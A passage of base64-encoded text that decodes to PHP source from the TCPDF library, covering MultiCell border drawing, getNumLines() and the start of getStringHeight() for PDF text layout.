Y3VycmVudFkgLSAkdGhpcy0+eTsKCQkJCQkJaWYgKCRyZXN0aCA+ICRoKSB7CgkJCQkJCQkkaCA9ICRyZXN0aDsKCQkJCQkJfQoJCQkJCX0gZWxzZSB7IC8vIG1pZGRsZSBjb2x1bW4KCQkJCQkJJGNib3JkZXIgPSAkYm9yZGVyX21pZGRsZTsKCQkJCQkJJGggPSAkdGhpcy0+aCAtICR0aGlzLT55IC0gJHRoaXMtPmJNYXJnaW47CgkJCQkJCSRyZXN0aCAtPSAkaDsKCQkJCQl9CgkJCQkJJGNjb2RlIC49ICR0aGlzLT5nZXRDZWxsQ29kZSgkdywgJGgsICcnLCAkY2JvcmRlciwgMSwgJycsICRmaWxsLCAnJywgMCwgdHJ1ZSkuIlxuIjsKCQkJCX0gLy8gZW5kIGZvciBlYWNoIGNvbHVtbgoJCQl9IGVsc2VpZiAoJHBhZ2UgPT0gJHN0YXJ0cGFnZSkgeyAvLyBmaXJzdCBwYWdlCgkJCQlmb3IgKCRjb2x1bW4gPSAkc3RhcnRjb2x1bW47ICRjb2x1bW4gPCAkdGhpcy0+bnVtX2NvbHVtbnM7ICsrJGNvbHVtbikgeyAvLyBmb3IgZWFjaCBjb2x1bW4KCQkJCQlpZiAoJGNvbHVtbiAhPSAkdGhpcy0+Y3VycmVudF9jb2x1bW4pIHsKCQkJCQkJJHRoaXMtPnNlbGVjdENvbHVtbigkY29sdW1uKTsKCQkJCQl9CgkJCQkJaWYgKCR0aGlzLT5ydGwpIHsKCQkJCQkJJHRoaXMtPnggLT0gJG1jX21hcmdpblsnUiddOwoJCQkJCX0gZWxzZSB7CgkJCQkJCSR0aGlzLT54ICs9ICRtY19tYXJnaW5bJ0wnXTsKCQkJCQl9CgkJCQkJaWYgKCRjb2x1bW4gPT0gJHN0YXJ0Y29sdW1uKSB7IC8vIGZpcnN0IGNvbHVtbgoJCQkJCQkkY2JvcmRlciA9ICRib3JkZXJfc3RhcnQ7CgkJCQkJCSR0aGlzLT55ID0gJG95OwoJCQkJCQkkaCA9ICR0aGlzLT5oIC0gJHRoaXMtPnkgLSAkdGhpcy0+Yk1hcmdpbjsKCQkJCQl9IGVsc2UgeyAvLyBtaWRkbGUgY29sdW1uCgkJCQkJCSRjYm9yZGVyID0gJGJvcmRlcl9taWRkbGU7CgkJCQkJCSRoID0gJHRoaXMtPmggLSAkdGhpcy0+eSAtICR0aGlzLT5iTWFyZ2luOwoJCQkJCQkkcmVzdGggLT0gJGg7CgkJCQkJfQoJCQkJCSRjY29kZSAuPSAkdGhpcy0+Z2V0Q2VsbENvZGUoJHcsICRoLCAnJywgJGNib3JkZXIsIDEsICcnLCAkZmlsbCwgJycsIDAsIHRydWUpLiJcbiI7CgkJCQl9IC8vIGVuZCBmb3IgZWFjaCBjb2x1bW4KCQkJfSBlbHNlaWYgKCRwYWdlID09ICRlbmRwYWdlKSB7IC8vIGxhc3QgcGFnZQoJCQkJZm9yICgkY29sdW1uID0gMDsgJGNvbHVtbiA8PSAkZW5kY29sdW1uOyArKyRjb2x1bW4pIHsgLy8gZm9yIGVhY2ggY29sdW1uCgkJCQkJaWYgKCRjb2x1bW4gIT0gJHRoaXMtPmN1cnJlbnRfY29sdW1uKSB7CgkJCQkJCSR0aGlzLT5zZWxlY3RDb2x1bW4oJGNvbHVtbik7CgkJCQkJfQoJCQkJCWlmICgkdGhpcy0+cnRsKSB7CgkJCQkJCSR0aGlzLT54IC09ICRtY19tYXJnaW5bJ1InXTsKCQkJCQl9IGVsc2UgewoJCQkJCQkkdGhpcy0+eCArPSAkbWNfbWFyZ2luWydMJ107CgkJCQkJfQoJCQkJCWlmICgkY29sdW1uID09ICRlbmRjb2x1bW4pIHsKCQkJCQkJLy8gZW5kIGNvbHVtbgoJCQkJCQkkY2JvcmRlciA9ICRib3JkZXJfZW5kOwoJCQkJCQkkaCA9ICRjdXJyZW50WSAtICR0aGlzLT55OwoJCQkJCQlpZiAoJHJlc3RoID4gJGgpIHsKCQkJCQkJCSRoID0gJHJlc3RoOwoJCQkJCQl9CgkJCQkJfSBlbHNlIHsKCQkJCQkJLy8gbWlkZGxlIGNvbHVtbgoJCQkJCQkkY2JvcmRlciA9ICRib3JkZXJfbWlkZGxlOwoJCQkJCQkkaCA9ICR0aGlzLT5oIC0gJHRoaXMtPnkgLSAkdGhpcy0+Yk1hcmdpbjsKCQkJCQkJJHJlc3RoIC09ICRoOwoJCQkJCX0KCQkJCQkkY2NvZGUgLj0gJHRoaXMtPmdldENlbGxDb2RlKCR3LCAkaCwgJycsICRjYm9yZGVyLCAxLCAnJywgJGZpbGwsICcnLCAwLCB0cnVlKS4iXG4iOwoJCQkJfSAvLyBlbmQgZm9yIGVhY2ggY29sdW1uCgkJCX0gZWxzZSB7IC8vIG1pZGRsZSBwYWdlCgkJCQlmb3IgKCRjb2x1bW4gPSAwOyAkY29sdW1uIDwgJHRoaXMtPm51bV9jb2x1bW5zOyArKyRjb2x1bW4pIHsgLy8gZm9yIGVhY2ggY29sdW1uCgkJCQkJJHRoaXMtPnNlbGVjdENvbHVtbigkY29sdW1uKTsKCQkJCQlpZiAoJHRoaXMtPnJ0bCkgewoJCQkJCQkkdGhpcy0+eCAtPSAkbWNfbWFyZ2luWydSJ107CgkJCQkJfSBlbHNlIHsKCQkJCQkJJHRoaXMtPnggKz0gJG1jX21hcmdpblsnTCddOwoJCQkJCX0KCQkJCQkkY2JvcmRlciA9ICRib3JkZXJfbWlkZGxlOwoJCQkJCSRoID0gJHRoaXMtPmggLSAkdGhpcy0+eSAtICR0aGlzLT5iTWFyZ2luOwoJCQkJCSRyZXN0aCAtPSAkaDsKCQkJCQkkY2NvZGUgLj0gJHRoaXMtPmdldENlbGxDb2RlKCR3LCAkaCwgJycsICRjYm9yZGVyLCAxLCAnJywgJGZpbGwsICcnLCAwLCB0cnVlKS4iXG4iOwoJCQkJfSAvLyBlbmQgZm9yIGVhY2ggY29sdW1uCgkJCX0KCQkJaWYgKCRjYm9yZGVyIE9SICRmaWxsKSB7CgkJCQkkb2Zmc2V0bGVuID0gc3RybGVuKCRjY29kZSk7CgkJCQkvLyBkcmF3IGJvcmRlciBhbmQgZmlsbAoJCQkJaWYgKCR0aGlzLT5pbnhvYmopIHsKCQkJCQkvLyB3ZSBhcmUgaW5zaWRlIGFuIFhPYmplY3QgdGVtcGxhdGUKCQkJCQlpZiAoZW5kKCR0aGlzLT54b2JqZWN0c1skdGhpcy0+eG9iamlkXVsndHJhbnNmbXJrJ10pICE9PSBmYWxzZSkgewoJCQkJCQkkcGFnZW1hcmtrZXkgPSBrZXkoJHRoaXMtPnhvYmplY3RzWyR0aGlzLT54b2JqaWRdWyd0cmFuc2ZtcmsnXSk7CgkJCQkJCSRwYWdlbWFyayA9ICR0aGlzLT54b2JqZWN0c1skdGhpcy0+eG9iamlkXVsndHJhbnNmbXJrJ11bJHBhZ2VtYXJra2V5XTsKCQkJCQkJJHRoaXMtPnhvYmplY3RzWyR0aGlzLT54b2JqaWRdWyd0cmFuc2ZtcmsnXVskcGFnZW1hcmtrZXldICs9ICRvZmZzZXRsZW47CgkJCQkJfSBlbHNlIHsKCQkJCQkJJHBhZ2VtYXJrID0gJHRoaXMtPnhvYmplY3RzWyR0aGlzLT54b2JqaWRdWydpbnRtcmsnXTsKCQkJCQkJJHRoaXMtPnhvYmplY3RzWyR0aGlzLT54b2JqaWRdWydpbnRtcmsnXSArPSAkb2Zmc2V0bGVuOwoJCQkJCX0KCQkJCQkkcGFnZWJ1ZmYgPSAkdGhpcy0+eG9iamVjdHNbJHRoaXMtPnhvYmppZF1bJ291dGRhdGEnXTsKCQkJCQkkcHN0YXJ0ID0gc3Vic3RyKCRwYWdlYnVmZiwgMCwgJHBhZ2VtYXJrKTsKCQkJCQkkcGVuZCA9IHN1YnN0cigkcGFnZWJ1ZmYsICRwYWdlbWFyayk7CgkJCQkJJHRoaXMtPnhvYmplY3RzWyR0aGlzLT54b2JqaWRdWydvdXRkYXRhJ10gPSAkcHN0YXJ0LiRjY29kZS4kcGVuZDsKCQkJCX0gZWxzZSB7CgkJCQkJaWYgKGVuZCgkdGhpcy0+dHJhbnNmbXJrWyR0aGlzLT5wYWdlXSkgIT09IGZhbHNlKSB7CgkJCQkJCSRwYWdlbWFya2tleSA9IGtleSgkdGhpcy0+dHJhbnNmbXJrWyR0aGlzLT5wYWdlXSk7CgkJCQkJCSRwYWdlbWFyayA9ICR0aGlzLT50cmFuc2ZtcmtbJHRoaXMtPnBhZ2VdWyRwYWdlbWFya2tleV07CgkJCQkJCSR0aGlzLT50cmFuc2ZtcmtbJHRoaXMtPnBhZ2VdWyRwYWdlbWFya2tleV0gKz0gJG9mZnNldGxlbjsKCQkJCQl9IGVsc2VpZiAoJHRoaXMtPkluRm9vdGVyKSB7CgkJCQkJCSRwYWdlbWFyayA9ICR0aGlzLT5mb290ZXJwb3NbJHRoaXMtPnBhZ2VdOwoJCQkJCQkkdGhpcy0+Zm9vdGVycG9zWyR0aGlzLT5wYWdlXSArPSAkb2Zmc2V0bGVuOwoJCQkJCX0gZWxzZSB7CgkJCQkJCSRwYWdlbWFyayA9ICR0aGlzLT5pbnRtcmtbJHRoaXMtPnBhZ2VdOwoJCQkJCQkkdGhpcy0+aW50bXJrWyR0aGlzLT5wYWdlXSArPSAkb2Zmc2V0bGVuOwoJCQkJCX0KCQkJCQkkcGFnZWJ1ZmYgPSAkdGhpcy0+Z2V0UGFnZUJ1ZmZlcigkdGhpcy0+cGFnZSk7CgkJCQkJJHBzdGFydCA9IHN1YnN0cigkcGFnZWJ1ZmYsIDAsICRwYWdlbWFyayk7CgkJCQkJJHBlbmQgPSBzdWJzdHIoJHBhZ2VidWZmLCAkcGFnZW1hcmspOwoJCQkJCSR0aGlzLT5zZXRQYWdlQnVmZmVyKCR0aGlzLT5wYWdlLCAkcHN0YXJ0LiRjY29kZS4kcGVuZCk7CgkJCQl9CgkJCX0KCQl9IC8vIGVuZCBmb3IgZWFjaCBwYWdlCgkJLy8gcmVzdG9yZSBwYWdlIHJlZ2lvbnMgY2hlY2sKCQkkdGhpcy0+Y2hlY2tfcGFnZV9yZWdpb25zID0gJGNoZWNrX3BhZ2VfcmVnaW9uczsKCQkvLyBHZXQgZW5kLW9mLWNlbGwgWSBwb3NpdGlvbgoJCSRjdXJyZW50WSA9ICR0aGlzLT5HZXRZKCk7CgkJLy8gcmVzdG9yZSBwcmV2aW91cyB2YWx1ZXMKCQlpZiAoJHRoaXMtPm51bV9jb2x1bW5zID4gMSkgewoJCQkkdGhpcy0+c2VsZWN0Q29sdW1uKCk7CgkJfSBlbHNlIHsKCQkJLy8gcmVzdG9yZSBvcmlnaW5hbCBtYXJnaW5zCgkJCSR0aGlzLT5sTWFyZ2luID0gJGxNYXJnaW47CgkJCSR0aGlzLT5yTWFyZ2luID0gJHJNYXJnaW47CgkJCWlmICgkdGhpcy0+cGFnZSA+ICRzdGFydHBhZ2UpIHsKCQkJCS8vIGNoZWNrIGZvciBtYXJnaW4gdmFyaWF0aW9ucyBiZXR3ZWVuIHBhZ2VzIChpLmUuIGJvb2tsZXQgbW9kZSkKCQkJCSRkbCA9ICgkdGhpcy0+cGFnZWRpbVskdGhpcy0+cGFnZV1bJ29sbSddIC0gJHRoaXMtPnBhZ2VkaW1bJHN0YXJ0cGFnZV1bJ29sbSddKTsKCQkJCSRkciA9ICgkdGhpcy0+cGFnZWRpbVskdGhpcy0+cGFnZV1bJ29ybSddIC0gJHRoaXMtPnBhZ2VkaW1bJHN0YXJ0cGFnZV1bJ29ybSddKTsKCQkJCWlmICgoJGRsICE9IDApIE9SICgkZHIgIT0gMCkpIHsKCQkJCQkkdGhpcy0+bE1hcmdpbiArPSAkZGw7CgkJCQkJJHRoaXMtPnJNYXJnaW4gKz0gJGRyOwoJCQkJfQoJCQl9CgkJfQoJCWlmICgkbG4gPiAwKSB7CgkJCS8vR28gdG8gdGhlIGJlZ2lubmluZyBvZiB0aGUgbmV4dCBsaW5lCgkJCSR0aGlzLT5zZXRZKCRjdXJyZW50WSArICRtY19tYXJnaW5bJ0InXSk7CgkJCWlmICgkbG4gPT0gMikgewoJCQkJJHRoaXMtPnNldFgoJHggKyAkdyArICRtY19tYXJnaW5bJ0wnXSArICRtY19tYXJnaW5bJ1InXSk7CgkJCX0KCQl9IGVsc2UgewoJCQkvLyBnbyBsZWZ0IG9yIHJpZ2h0IGJ5IGNhc2UKCQkJJHRoaXMtPnNldFBhZ2UoJHN0YXJ0cGFnZSk7CgkJCSR0aGlzLT55ID0gJHk7CgkJCSR0aGlzLT5zZXRYKCR4ICsgJHcgKyAkbWNfbWFyZ2luWydMJ10gKyAkbWNfbWFyZ2luWydSJ10pOwoJCX0KCQkkdGhpcy0+c2V0Q29udGVudE1hcmsoKTsKCQkkdGhpcy0+Y2VsbF9wYWRkaW5nID0gJHByZXZfY2VsbF9wYWRkaW5nOwoJCSR0aGlzLT5jZWxsX21hcmdpbiA9ICRwcmV2X2NlbGxfbWFyZ2luOwoJCSR0aGlzLT5jbE1hcmdpbiA9ICR0aGlzLT5sTWFyZ2luOwoJCSR0aGlzLT5jck1hcmdpbiA9ICR0aGlzLT5yTWFyZ2luOwoJCXJldHVybiAkbmw7Cgl9CgoJLyoqCgkgKiBUaGlzIG1ldGhvZCByZXR1cm4gdGhlIGVzdGltYXRlZCBudW1iZXIgb2YgbGluZXMgZm9yIHByaW50IGEgc2ltcGxlIHRleHQgc3RyaW5nIHVzaW5nIE11bHRpY2VsbCgpIG1ldGhvZC4KCSAqIEBwYXJhbSBzdHJpbmcgJHR4dCBTdHJpbmcgZm9yIGNhbGN1bGF0aW5nIGhpcyBoZWlnaHQKCSAqIEBwYXJhbSBmbG9hdCAkdyBXaWR0aCBvZiBjZWxscy4gSWYgMCwgdGhleSBleHRlbmQgdXAgdG8gdGhlIHJpZ2h0IG1hcmdpbiBvZiB0aGUgcGFnZS4KCSAqIEBwYXJhbSBib29sZWFuICRyZXNldGggaWYgdHJ1ZSByZXNldCB0aGUgbGFzdCBjZWxsIGhlaWdodCAoZGVmYXVsdCBmYWxzZSkuCgkgKiBAcGFyYW0gYm9vbGVhbiAkYXV0b3BhZGRpbmcgaWYgdHJ1ZSwgdXNlcyBpbnRlcm5hbCBwYWRkaW5nIGFuZCBhdXRvbWF0aWNhbGx5IGFkanVzdCBpdCB0byBhY2NvdW50IGZvciBsaW5lIHdpZHRoIChkZWZhdWx0IHRydWUpLgoJICogQHBhcmFtIGFycmF5fG51bGwgJGNlbGxwYWRkaW5nIEludGVybmFsIGNlbGwgcGFkZGluZywgaWYgZW1wdHkgdXNlcyBkZWZhdWx0IGNlbGwgcGFkZGluZy4KCSAqIEBwYXJhbSBtaXhlZCAkYm9yZGVyIEluZGljYXRlcyBpZiBib3JkZXJzIG11c3QgYmUgZHJhd24gYXJvdW5kIHRoZSBjZWxsLiBUaGUgdmFsdWUgY2FuIGJlIGEgbnVtYmVyOjx1bD48bGk+MDogbm8gYm9yZGVyIChkZWZhdWx0KTwvbGk+PGxpPjE6IGZyYW1lPC9saT48L3VsPiBvciBhIHN0cmluZyBjb250YWluaW5nIHNvbWUgb3IgYWxsIG9mIHRoZSBmb2xsb3dpbmcgY2hhcmFjdGVycyAoaW4gYW55IG9yZGVyKTo8dWw+PGxpPkw6IGxlZnQ8L2xpPjxsaT5UOiB0b3A8L2xpPjxsaT5SOiByaWdodDwvbGk+PGxpPkI6IGJvdHRvbTwvbGk+PC91bD4gb3IgYW4gYXJyYXkgb2YgbGluZSBzdHlsZXMgZm9yIGVhY2ggYm9yZGVyIGdyb3VwIC0gZm9yIGV4YW1wbGU6IGFycmF5KCdMVFJCJyA9PiBhcnJheSgnd2lkdGgnID0+IDIsICdjYXAnID0+ICdidXR0JywgJ2pvaW4nID0+ICdtaXRlcicsICdkYXNoJyA9PiAwLCAnY29sb3InID0+IGFycmF5KDAsIDAsIDApKSkKCSAqIEByZXR1cm4gZmxvYXQgUmV0dXJuIHRoZSBtaW5pbWFsIGhlaWdodCBuZWVkZWQgZm9yIG11bHRpY2VsbCBtZXRob2QgZm9yIHByaW50aW5nIHRoZSAkdHh0IHBhcmFtLgoJICogQGF1dGhvciBBbGV4YW5kZXIgRXNjYWxvbmEgRmVyblxFMW5kZXosIE5pY29sYSBBc3VuaQoJICogQHB1YmxpYwoJICogQHNpbmNlIDQuNS4wMTEKCSAqLwoJcHVibGljIGZ1bmN0aW9uIGdldE51bUxpbmVzKCR0eHQsICR3PTAsICRyZXNldGg9ZmFsc2UsICRhdXRvcGFkZGluZz10cnVlLCAkY2VsbHBhZGRpbmc9bnVsbCwgJGJvcmRlcj0wKSB7CgkJaWYgKCR0eHQgPT09IE5VTEwpIHsKCQkJcmV0dXJuIDA7CgkJfQoJCWlmICgkdHh0ID09PSAnJykgewoJCQkvLyBlbXB0eSBzdHJpbmcKCQkJcmV0dXJuIDE7CgkJfQoJCS8vIGFkanVzdCBpbnRlcm5hbCBwYWRkaW5nCgkJJHByZXZfY2VsbF9wYWRkaW5nID0gJHRoaXMtPmNlbGxfcGFkZGluZzsKCQkkcHJldl9sYXN0aCA9ICR0aGlzLT5sYXN0aDsKCQlpZiAoaXNfYXJyYXkoJGNlbGxwYWRkaW5nKSkgewoJCQkkdGhpcy0+Y2VsbF9wYWRkaW5nID0gJGNlbGxwYWRkaW5nOwoJCX0KCQkkdGhpcy0+YWRqdXN0Q2VsbFBhZGRpbmcoJGJvcmRlcik7CgkJaWYgKFRDUERGX1NUQVRJQzo6ZW1wdHlfc3RyaW5nKCR3KSBPUiAoJHcgPD0gMCkpIHsKCQkJaWYgKCR0aGlzLT5ydGwpIHsKCQkJCSR3ID0gJHRoaXMtPnggLSAkdGhpcy0+bE1hcmdpbjsKCQkJfSBlbHNlIHsKCQkJCSR3ID0gJHRoaXMtPncgLSAkdGhpcy0+ck1hcmdpbiAtICR0aGlzLT54OwoJCQl9CgkJfQoJCSR3bWF4ID0gJHcgLSAkdGhpcy0+Y2VsbF9wYWRkaW5nWydMJ10gLSAkdGhpcy0+Y2VsbF9wYWRkaW5nWydSJ107CgkJaWYgKCRyZXNldGgpIHsKCQkJLy8gcmVzZXQgcm93IGhlaWdodAoJCQkkdGhpcy0+cmVzZXRMYXN0SCgpOwoJCX0KCQkkbGluZXMgPSAxOwoJCSRzdW0gPSAwOwoJCSRjaGFycyA9IFRDUERGX0ZPTlRTOjp1dGY4QmlkaShUQ1BERl9GT05UUzo6VVRGOFN0cmluZ1RvQXJyYXkoJHR4dCwgJHRoaXMtPmlzdW5pY29kZSwgJHRoaXMtPkN1cnJlbnRGb250KSwgJHR4dCwgJHRoaXMtPnRtcHJ0bCwgJHRoaXMtPmlzdW5pY29kZSwgJHRoaXMtPkN1cnJlbnRGb250KTsKCQkkY2hhcnNXaWR0aCA9ICR0aGlzLT5HZXRBcnJTdHJpbmdXaWR0aCgkY2hhcnMsICcnLCAnJywgMCwgdHJ1ZSk7CgkJJGxlbmd0aCA9IGNvdW50KCRjaGFycyk7CgkJJGxhc3RTZXBhcmF0b3IgPSAtMTsKCQlmb3IgKCRpID0gMDsgJGkgPCAkbGVuZ3RoOyArKyRpKSB7CgkJCSRjID0gJGNoYXJzWyRpXTsKCQkJJGNoYXJXaWR0aCA9ICRjaGFyc1dpZHRoWyRpXTsKCQkJaWYgKCgkYyAhPSAxNjApCgkJCQkJQU5EICgoJGMgPT0gMTczKQoJCQkJCQlPUiBwcmVnX21hdGNoKCR0aGlzLT5yZV9zcGFjZXMsIFRDUERGX0ZPTlRTOjp1bmljaHIoJGMsICR0aGlzLT5pc3VuaWNvZGUpKQoJCQkJCQlPUiAoKCRjID09IDQ1KQoJCQkJCQkJQU5EICgkaSA+IDApIEFORCAoJGkgPCAoJGxlbmd0aCAtIDEpKQoJCQkJCQkJQU5EIEBwcmVnX21hdGNoKCcvW1xwe0x9XS8nLiR0aGlzLT5yZV9zcGFjZVsnbSddLCBUQ1BERl9GT05UUzo6dW5pY2hyKCRjaGFyc1soJGkgLSAxKV0sICR0aGlzLT5pc3VuaWNvZGUpKQoJCQkJCQkJQU5EIEBwcmVnX21hdGNoKCcvW1xwe0x9XS8nLiR0aGlzLT5yZV9zcGFjZVsnbSddLCBUQ1BERl9GT05UUzo6dW5pY2hyKCRjaGFyc1soJGkgKyAxKV0sICR0aGlzLT5pc3VuaWNvZGUpKQoJCQkJCQkpCgkJCQkJKQoJCQkJKSB7CgkJCQkkbGFzdFNlcGFyYXRvciA9ICRpOwoJCQl9CgkJCWlmICgoKCRzdW0gKyAkY2hhcldpZHRoKSA+ICR3bWF4KSBPUiAoJGMgPT0gMTApKSB7CgkJCQkrKyRsaW5lczsKCQkJCWlmICgkYyA9PSAxMCkgewoJCQkJCSRsYXN0U2VwYXJhdG9yID0gLTE7CgkJCQkJJHN1bSA9IDA7CgkJCQl9IGVsc2VpZiAoJGxhc3RTZXBhcmF0b3IgIT0gLTEpIHsKCQkJCQkkaSA9ICRsYXN0U2VwYXJhdG9yOwoJCQkJCSRsYXN0U2VwYXJhdG9yID0gLTE7CgkJCQkJJHN1bSA9IDA7CgkJCQl9IGVsc2UgewoJCQkJCSRzdW0gPSAkY2hhcldpZHRoOwoJCQkJfQoJCQl9IGVsc2UgewoJCQkJJHN1bSArPSAkY2hhcldpZHRoOwoJCQl9CgkJfQoJCWlmICgkY2hhcnNbKCRsZW5ndGggLSAxKV0gPT0gMTApIHsKCQkJLS0kbGluZXM7CgkJfQoJCSR0aGlzLT5jZWxsX3BhZGRpbmcgPSAkcHJldl9jZWxsX3BhZGRpbmc7CgkJJHRoaXMtPmxhc3RoID0gJHByZXZfbGFzdGg7CgkJcmV0dXJuICRsaW5lczsKCX0KCgkvKioKCSAqIFRoaXMgbWV0aG9kIHJldHVybiB0aGUgZXN0aW1hdGVkIGhlaWdodCBuZWVkZWQgZm9yIHByaW50aW5nIGEgc2ltcGxlIHRleHQgc3RyaW5nIHVzaW5nIHRoZSBNdWx0aWNlbGwoKSBtZXRob2QuCgkgKiBHZW5lcmFsbHksIGlmIHlvdSB3YW50IHRvIGtub3cgdGhlIGV4YWN0IGhlaWdodCBmb3IgYSBibG9jayBvZiBjb250ZW50IHlvdSBjYW4gdXNlIHRoZSBmb2xsb3dpbmcgYWx0ZXJuYXRpdmUgdGVjaG5pcXVlOgoJICogQHByZQoJICogIC8vIHN0b3JlIGN1cnJlbnQgb2JqZWN0CgkgKiAgJHBkZi0+c3RhcnRUcmFuc2FjdGlvbigpOwoJICogIC8vIHN0b3JlIHN0YXJ0aW5nIHZhbHVlcwoJICogICRzdGFydF95ID0gJHBkZi0+R2V0WSgpOwoJICogICRzdGFydF9wYWdlID0gJHBkZi0+Z2V0UGFnZSgpOwoJICogIC8vIGNhbGwgeW91ciBwcmludGluZyBmdW5jdGlvbnMgd2l0aCB5b3VyIHBhcmFtZXRlcnMKCSAqICAvLyAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0KCSAqICAkcGRmLT5NdWx0aUNlbGwoJHc9MCwgJGg9MCwgJHR4dCwgJGJvcmRlcj0xLCAkYWxpZ249J0wnLCAkZmlsbD1mYWxzZSwgJGxuPTEsICR4PW51bGwsICR5PW51bGwsICRyZXNldGg9dHJ1ZSwgJHN0cmV0Y2g9MCwgJGlzaHRtbD1mYWxzZSwgJGF1dG9wYWRkaW5nPXRydWUsICRtYXhoPTApOwoJICogIC8vIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLQoJICogIC8vIGdldCB0aGUgbmV3IFkKCSAqICAkZW5kX3kgPSAkcGRmLT5HZXRZKCk7CgkgKiAgJGVuZF9wYWdlID0gJHBkZi0+Z2V0UGFnZSgpOwoJICogIC8vIGNhbGN1bGF0ZSBoZWlnaHQKCSAqICAkaGVpZ2h0ID0gMDsKCSAqICBpZiAoJGVuZF9wYWdlID09ICRzdGFydF9wYWdlKSB7CgkgKiAgCSRoZWlnaHQgPSAkZW5kX3kgLSAkc3RhcnRfeTsKCSAqICB9IGVsc2UgewoJICogIAlmb3IgKCRwYWdlPSRzdGFydF9wYWdlOyAkcGFnZSA8PSAkZW5kX3BhZ2U7ICsrJHBhZ2UpIHsKCSAqICAJCSR0aGlzLT5zZXRQYWdlKCRwYWdlKTsKCSAqICAJCWlmICgkcGFnZSA9PSAkc3RhcnRfcGFnZSkgewoJICogIAkJCS8vIGZpcnN0IHBhZ2UKCSAqICAJCQkkaGVpZ2h0ICs9ICR0aGlzLT5oIC0gJHN0YXJ0X3kgLSAkdGhpcy0+Yk1hcmdpbjsKCSAqICAJCX0gZWxzZWlmICgkcGFnZSA9PSAkZW5kX3BhZ2UpIHsKCSAqICAJCQkvLyBsYXN0IHBhZ2UKCSAqICAJCQkkaGVpZ2h0ICs9ICRlbmRfeSAtICR0aGlzLT50TWFyZ2luOwoJICogIAkJfSBlbHNlIHsKCSAqICAJCQkkaGVpZ2h0ICs9ICR0aGlzLT5oIC0gJHRoaXMtPnRNYXJnaW4gLSAkdGhpcy0+Yk1hcmdpbjsKCSAqICAJCX0KCSAqICAJfQoJICogIH0KCSAqICAvLyByZXN0b3JlIHByZXZpb3VzIG9iamVjdAoJICogICRwZGYgPSAkcGRmLT5yb2xsYmFja1RyYW5zYWN0aW9uKCk7CgkgKgoJICogQHBhcmFtIGZsb2F0ICR3IFdpZHRoIG9mIGNlbGxzLiBJZiAwLCB0aGV5IGV4dGVuZCB1cCB0byB0aGUgcmlnaHQgbWFyZ2luIG9mIHRoZSBwYWdlLgoJICogQHBhcmFtIHN0cmluZyAkdHh0IFN0cmluZyBmb3IgY2FsY3VsYXRpbmcgaGlzIGhlaWdodAoJICogQHBhcmFtIGJvb2xlYW4gJHJlc2V0aCBpZiB0cnVlIHJlc2V0IHRoZSBsYXN0IGNlbGwgaGVpZ2h0IChkZWZhdWx0IGZhbHNlKS4KCSAqIEBwYXJhbSBib29sZWFuICRhdXRvcGFkZGluZyBpZiB0cnVlLCB1c2VzIGludGVybmFsIHBhZGRpbmcgYW5kIGF1dG9tYXRpY2FsbHkgYWRqdXN0IGl0IHRvIGFjY291bnQgZm9yIGxpbmUgd2lkdGggKGRlZmF1bHQgdHJ1ZSkuCgkgKiBAcGFyYW0gYXJyYXl8bnVsbCAkY2VsbHBhZGRpbmcgSW50ZXJuYWwgY2VsbCBwYWRkaW5nLCBpZiBlbXB0eSB1c2VzIGRlZmF1bHQgY2VsbCBwYWRkaW5nLgoJICogQHBhcmFtIG1peGVkICRib3JkZXIgSW5kaWNhdGVzIGlmIGJvcmRlcnMgbXVzdCBiZSBkcmF3biBhcm91bmQgdGhlIGNlbGwuIFRoZSB2YWx1ZSBjYW4gYmUgYSBudW1iZXI6PHVsPjxsaT4wOiBubyBib3JkZXIgKGRlZmF1bHQpPC9saT48bGk+MTogZnJhbWU8L2xpPjwvdWw+IG9yIGEgc3RyaW5nIGNvbnRhaW5pbmcgc29tZSBvciBhbGwgb2YgdGhlIGZvbGxvd2luZyBjaGFyYWN0ZXJzIChpbiBhbnkgb3JkZXIpOjx1bD48bGk+TDogbGVmdDwvbGk+PGxpPlQ6IHRvcDwvbGk+PGxpPlI6IHJpZ2h0PC9saT48bGk+QjogYm90dG9tPC9saT48L3VsPiBvciBhbiBhcnJheSBvZiBsaW5lIHN0eWxlcyBmb3IgZWFjaCBib3JkZXIgZ3JvdXAgLSBmb3IgZXhhbXBsZTogYXJyYXkoJ0xUUkInID0+IGFycmF5KCd3aWR0aCcgPT4gMiwgJ2NhcCcgPT4gJ2J1dHQnLCAnam9pbicgPT4gJ21pdGVyJywgJ2Rhc2gnID0+IDAsICdjb2xvcicgPT4gYXJyYXkoMCwgMCwgMCkpKQoJICogQHJldHVybiBmbG9hdCBSZXR1cm4gdGhlIG1pbmltYWwgaGVpZ2h0IG5lZWRlZCBmb3IgbXVsdGljZWxsIG1ldGhvZCBmb3IgcHJpbnRpbmcgdGhlICR0eHQgcGFyYW0uCgkgKiBAYXV0aG9yIE5pY29sYSBBc3VuaSwgQWxleGFuZGVyIEVzY2Fsb25hIEZlcm5cRTFuZGV6CgkgKiBAcHVibGljCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBnZXRTdHJpbmdIZWlnaHQoJHcsICR0eHQsICRyZXNldGg9ZmFsc2UsICRhdXRvcGFkZGluZz10cnVlLCAkY2VsbHBhZGRpbmc9bnVsbCwgJGJvcmRlcj0wKSB7CgkJLy8gYWRqdXN0IGludGVybmFsIHBhZGRpbmcKCQkkcHJldl9jZWxsX3BhZGRpbmcgPSAkdGhpcy0+Y2VsbF9wYWRkaW5nOwoJCSRwcmV2X2xhc3RoID0gJHRoaXMtPmxhc3RoOwoJCWlmIChpc19hcnJheSgkY2VsbHBhZGRpbmcpKSB7CgkJCSR0aGlzLT5jZWxsX3BhZGRpbmcgPSAkY2VsbHBhZGRpbmc7CgkJfQoJCSR0aGlzLT5hZGp1c3RDZWxsUGFkZGluZygkYm9yZGVyKTsKCQkkbGluZXMgPSAkdGhpcy0+Z2V0TnVtTGluZXMoJHR4dCwgJHcsICRyZXNldGgsICRhdXRvcGFkZGluZywgJGNlbGxwYWRkaW5nLCAkYm9yZGVyKTsKCQkkaGVpZ2h0ID0gJHRoaXMtPmdldENlbGxIZWlnaHQoKCRsaW5lcyAqICR0aGlzLT5Gb250U2l6ZSksICRhdXRvcGFkZGluZyk7CgkJJHRoaXMtPmNlbGxfcGFkZGluZyA9ICRwcmV2X2NlbGxfcGFkZGluZzsKCQkkdGhpcy0+bGFzdGggPSAkcH